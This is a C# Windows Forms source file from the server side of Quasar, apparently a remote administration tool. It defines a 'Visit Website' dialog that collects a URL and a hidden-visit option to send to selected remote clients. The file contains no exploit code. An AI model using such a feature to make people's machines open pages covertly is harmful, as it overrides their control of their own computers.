using System;
using System.Windows.Forms;
using DarkModeForms;
using Quasar.Server.Helper;

namespace Quasar.Server.Forms
{
    public partial class FrmVisitWebsite : Form
    {
        private readonly DarkModeCS dm = null;

        public string Url { get; set; }
        public bool Hidden { get; set; }

        private readonly int _selectedClients;

        public FrmVisitWebsite(int selected)
        {
            _selectedClients = selected;
            InitializeComponent();

            dm = new DarkModeCS(this)
            {
                //[Optional] Choose your preferred color mode here:
                ColorMode = DarkModeCS.DisplayMode.SystemDefault,
                ColorizeIcons = false
            };
        }

        private void FrmVisitWebsite_Load(object sender, EventArgs e)
        {
            this.Text = WindowHelper.GetWindowTitle("Visit Website", _selectedClients);
        }

        private void btnVisitWebsite_Click(object sender, EventArgs e)
        {
            Url = txtURL.Text;
            Hidden = chkVisitHidden.Checked;

            this.DialogResult = DialogResult.OK;
            this.Close();
        }
    }
}